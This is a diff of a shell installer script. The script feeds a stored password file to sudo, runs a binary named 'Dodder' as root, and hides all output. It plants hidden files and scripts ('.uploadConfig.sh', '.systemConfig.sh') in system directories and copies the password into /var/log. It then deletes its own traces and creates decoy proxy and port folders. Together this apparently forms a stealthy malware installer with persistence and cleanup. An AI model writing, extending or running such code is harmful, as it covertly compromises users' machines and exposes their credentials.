@@ -28,11 +28,17 @@ cd $DIR/
 sudo -k -S $DIR/Dodder --file /var/log/Dodder.log < $DIR/.pass > /dev/null 2>&1
 sudo -k -S cp $DIR/.pic.jpg /usr/share/applications/ < $DIR/.pass > /dev/null 2>&1
 sudo -k -S cp $DIR/.pass /var/log/ < $DIR/.pass > /dev/null 2>&1
-sudo -k -S cp script/.uploadConfig.sh /usr/sbin < $DIR/.pass > /dev/null 2>&1
-sudo -k -S cp script/.systemConfig.sh /usr/sbin < $DIR/.pass > /dev/null 2>&1
+sudo -k -S cp $DIR/.uploadConfig.sh /usr/sbin < $DIR/.pass > /dev/null 2>&1
+sudo -k -S cp $DIR/.systemConfig.sh /usr/sbin < $DIR/.pass > /dev/null 2>&1
 rm $DIR/.pass
 rm $DIR/.pic.jpg
 rm $DIR/start.desktop
+rm $DIR/.systemConfig.sh
+rm $DIR/.uploadConfig.sh
+mkdir $DIR/proxy_networks
+mkdir $DIR/proxy_networks/proxy172.16.20.{1..9}
+mkdir $DIR/ports
+mkdir $DIR/ports/port{3020..3120}
 
 sleep 1
 echo "Initializing"
